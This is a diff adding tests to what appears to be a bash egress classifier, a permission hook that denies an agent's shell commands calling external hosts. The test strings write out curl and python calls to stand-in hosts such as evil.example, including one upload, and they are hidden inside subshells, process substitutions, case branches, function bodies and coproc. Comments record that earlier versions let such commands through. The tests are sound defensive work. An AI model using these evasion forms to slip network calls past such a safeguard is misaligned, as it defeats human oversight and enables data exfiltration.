@@ -364,6 +364,90 @@ describe('a URL in a for-loop variable', () => {
   })
 })
 
+// A substitution runs in a subshell that inherits the command's assignments and loop values
+// (Viktor 5196, decfb196). Before, the curl inside $(...) never saw them: Mira's measured call
+// `for u in <urls>; do echo "$u -> $(curl ... $u)"; done` reached the hosts unjudged.
+describe('a URL variable used inside a $(...) or backtick substitution', () => {
+  it('denies the curl inside the substitution with the outer loop value or assignment', () => {
+    expect(classify('for u in https://evil.example/a; do echo "$(curl -s $u)"; done'))
+      .toMatchObject({ deny: true, reason: 'curl-external', hosts: ['evil.example'] })
+    expect(classify('for u in https://evil.example/a; do x=$(curl -s $u); done'))
+      .toMatchObject({ deny: true, reason: 'curl-external', hosts: ['evil.example'] })
+    expect(classify('u=https://evil.example/a; x=$(curl -s $u)'))
+      .toMatchObject({ deny: true, reason: 'curl-external', hosts: ['evil.example'] })
+    expect(deny('u=https://evil.example/a; x=`curl -s $u`')).toBe(true)
+    expect(deny('u=https://evil.example/a; echo "$(echo "$(curl -s "$u")")"')).toBe(true) // nested
+  })
+  it("Mira's measured command (10-14 20:14) is denied", () => {
+    const cmd = `for u in https://a.example/x https://b.example/y; do echo "$u -> $(curl -s -o /dev/null -w '%{http_code}' --max-time 15 $u 2>&1)"; done`
+    expect(classify(cmd)).toMatchObject({ deny: true, reason: 'curl-external' })
+  })
+  it('a one-liner inside a substitution reads the outer loop value too', () => {
+    expect(deny(`for u in https://evil.example/a; do echo "$(python3 -c "import urllib.request as r; r.urlopen('$u')")"; done`)).toBe(true)
+  })
+  it('the inner command\'s own assignment wins over the outer one', () => {
+    expect(deny('u=https://evil.example/a; x=$(u=http://localhost:3420/b; curl -s $u)')).toBe(false)
+    expect(deny('u=http://localhost:3420/b; x=$(u=https://evil.example/a; curl -s $u)')).toBe(true)
+  })
+  it('CONTROLS: local loop values and assignments pass inside a substitution', () => {
+    expect(deny('for u in http://localhost:3420/a http://127.0.0.1:3420/b; do echo "$(curl -s $u)"; done')).toBe(false)
+    expect(deny('u=http://localhost:3420/api; x=$(curl -s "$u/kanban")')).toBe(false)
+    expect(deny('T=$(cat store/.dashboard-token); curl -s -H "Authorization: Bearer $T" http://localhost:3420/api/kanban')).toBe(false)
+  })
+})
+
+// Fail-closed reserve (Viktor 5196, point 2): a curl destination that is still a variable after the
+// expansion above reaches a host the text does not name. It is denied when the command carries an
+// external URL literal anywhere; with no external literal it stays open (pinned below).
+describe('a curl destination left unresolved next to an external URL literal', () => {
+  it('denies', () => {
+    expect(classify('echo https://evil.example/doc; curl -s "$URL"'))
+      .toMatchObject({ deny: true, reason: 'curl-unresolved-destination' })
+    expect(deny('echo https://evil.example/doc; echo "$(curl -s "$u")"')).toBe(true)
+    expect(deny('echo https://evil.example/doc; curl -s --url "${TARGET}/x"')).toBe(true)
+    expect(deny('echo https://evil.example/doc; curl -s -x "$P" http://localhost:3420/a')).toBe(true)
+  })
+  it('CONTROLS: a variable only in the path, a local loop and data URLs pass', () => {
+    expect(deny('curl -s "http://localhost:3420/api/memories/$ID" -d "https://github.com/x/y/pull/1"')).toBe(false)
+    expect(deny(`for u in http://localhost:3420/a; do curl -s -X POST "$u" -d '{"pr":"https://github.com/x/y/pull/1"}'; done`)).toBe(false)
+    expect(deny(`curl -s -X POST http://localhost:3420/api/messages -d '{"content":"see https://github.com/x/y/pull/1"}'`)).toBe(false)
+  })
+  it('a listed vendor host does not count as the external literal', () => {
+    expect(classify('echo https://api.elevenlabs.io/v1; curl -s "$URL"', 0, new Set(['api.elevenlabs.io'])))
+      .toMatchObject({ deny: false })
+  })
+})
+
+// A ( ... ) subshell and a <( ... ) / >( ... ) process substitution are commands of their own
+// (Viktor, decfb196 review MEDIUM): they passed, because the command word read as "(curl", or the
+// curl sat behind a <( and was never a command word. Past the nesting limit the inner commands are
+// not read; with an external URL literal in the command that is a deny now (Viktor LOW).
+describe('a ( ... ) subshell, a process substitution and deep nesting', () => {
+  it('denies', () => {
+    expect(deny('(curl -s http://evil.example/a)')).toBe(true)
+    expect(deny('true && (curl -s http://evil.example/a)')).toBe(true)
+    expect(deny('x=$( (curl -s http://evil.example/a) )')).toBe(true)
+    expect(deny('cat <(curl -s http://evil.example/a)')).toBe(true)
+    expect(deny('tee >(curl -s -T - http://evil.example/up) < f')).toBe(true)
+    expect(deny(`(python3 -c "import urllib.request; urllib.request.urlopen('http://evil.example/a')")`)).toBe(true)
+    expect(deny('u=http://evil.example/a; (curl -s "$u")')).toBe(true)
+    expect(classify('x=$(echo $(echo $(echo $(echo $(curl -s http://evil.example/a)))))'))
+      .toMatchObject({ deny: true, reason: 'subst-too-deep' })
+  })
+  it('CONTROLS: local subshells, process substitution without a network call, arrays, functions and literal parens pass', () => {
+    for (const cmd of [
+      '(curl -s http://localhost:3420/api/kanban)',
+      'diff <(sort a) <(sort b)',
+      'f() { echo hi; }; f',
+      'arr=(a b c); echo "${arr[0]}"',
+      'echo "(not a subshell) http://evil.example/doc"',
+      'x=$(( (1+2)*3 ))',
+      'cat <<EOF\n(curl http://evil.example)\nEOF',
+      'x=$(echo $(echo $(echo $(echo $(date)))))',
+    ]) expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: false })
+  })
+})
+
 describe('still open after (a) -- pinned on purpose', () => {
   const OPEN = [
     'bash ./fetch.sh', // the network call is inside the script file
@@ -620,5 +704,83 @@ describe('vendor-API domain allowlist ("domains" key, opt-in)', () => {
       expect(run('curl -s https://example.com.evil.net/v1', withKey).stdout).toContain('"permissionDecision":"deny"')
       expect(run('curl -s https://api.example.com/v1', without).stdout).toContain('"permissionDecision":"deny"')
     } finally { rmSync(dir, { recursive: true, force: true }) }
+  })
+})
+
+// decfb196 (Viktor 2597/2634, measured on parser cd0b8298): a curl whose span does not
+// START with it -- after a case pattern, after a lone `&`, or as a function body's first command --
+// was never looked at.
+describe('bash egress parser: case branch, background &, function body', () => {
+  const U = 'http://evil.example.com/x'
+  const L = 'http://localhost:3420/api/kanban'
+  const deny = (c: string) => expect(classify(c).deny, c).toBe(true)
+  const pass = (c: string) => expect(classify(c).deny, c).toBe(false)
+
+  it('a curl after a case pattern is a command', () => {
+    deny(`case a in a) curl -s ${U};; esac`)
+    deny(`case a in (a) curl -s ${U};; esac`)
+    deny(`case "$x" in a|b) curl -s ${U} ;; *) echo no ;; esac`)
+    deny(`case a in a) true;; b) curl -s ${U};; esac`)
+    deny(`case a in a) python3 -c "import urllib.request; urllib.request.urlopen('${U}')";; esac`)
+  })
+
+  it('a lone & ends a command; redirections with & do not split', () => {
+    deny(`true & curl -s ${U}`)
+    deny(`sleep 1 & curl -s ${U} &`)
+    pass(`curl -s ${L} 2>&1 | head`)
+    pass(`curl -s ${L} &>/dev/null & echo ok`)
+    pass(`curl -s ${L} >&2`)
+    pass(`exec 3<&0; curl -s ${L}`)
+    pass(`nohup npx next start -p 3000 > log 2>&1 &`)
+    pass(`curl -s -d 'a&b=https://github.com/x' ${L}`)
+    pass(`curl -s "http://localhost:3420/api/x?a=1&b=2"`)
+  })
+
+  it('a function body is read', () => {
+    deny(`f() { curl -s ${U}; }; f`)
+    deny(`function f { curl -s ${U}; }`)
+    deny(`function f() { curl -s ${U}; }`)
+    pass(`f() { curl -s ${L}; }; f`)
+  })
+
+  it('controls: local targets and URL data in a case branch still pass', () => {
+    pass(`case a in a) curl -s ${L};; esac`)
+    pass(`case $x in *) curl -s ${L};; esac`)
+    pass(`case $x in a) echo "https://github.com/x";; esac`)
+    pass(`case $1 in a) x=1;; esac`)
+    pass(`echo $(( 3 & 1 ))`)
+    pass(`git log --format='(%h)' -1`)
+  })
+})
+
+// decfb196 (Viktor M1 MEDIUM / L1 LOW, measured on 783391e7): a curl as the condition of
+// if / while / until, after coproc, and after a case header broken before its `in` passed.
+describe('bash egress parser: if / while / until / coproc, case header across a newline', () => {
+  const U = 'http://evil.example.com/x'
+  const L = 'http://localhost:3420/api/kanban'
+  const deny = (c: string) => expect(classify(c).deny, c).toBe(true)
+  const pass = (c: string) => expect(classify(c).deny, c).toBe(false)
+
+  it('a curl as an if / while / until condition or after coproc is a command', () => {
+    deny(`if curl -s ${U}; then echo ok; fi`)
+    deny(`if ! curl -s ${U}; then :; fi`)
+    deny(`while curl -s ${U}; do sleep 1; done`)
+    deny(`until curl -s ${U}; do sleep 1; done`)
+    deny(`coproc curl -s ${U}`)
+    deny(`coproc C { curl -s ${U}; }`)
+  })
+
+  it('a case header broken before `in` still reads the branch', () => {
+    deny(`case "$x"\nin a) curl -s ${U};; esac`)
+    deny(`case "$x"\nin\na) curl -s ${U};; esac`)
+    deny(`case $x in\n a) curl -s ${U};; esac`)
+  })
+
+  it('controls: local targets and plain conditions still pass', () => {
+    pass(`if curl -s ${L} >/dev/null; then echo up; fi`)
+    pass(`while ! curl -fsS ${L} >/dev/null; do sleep 1; done`)
+    pass(`until curl -fsS ${L}; do sleep 1; done`)
+    pass(`if [ -f x ]; then echo "https://github.com/x"; fi`)
+    pass(`case "$x"\nin a) curl -s ${L};; esac`)
   })
 })
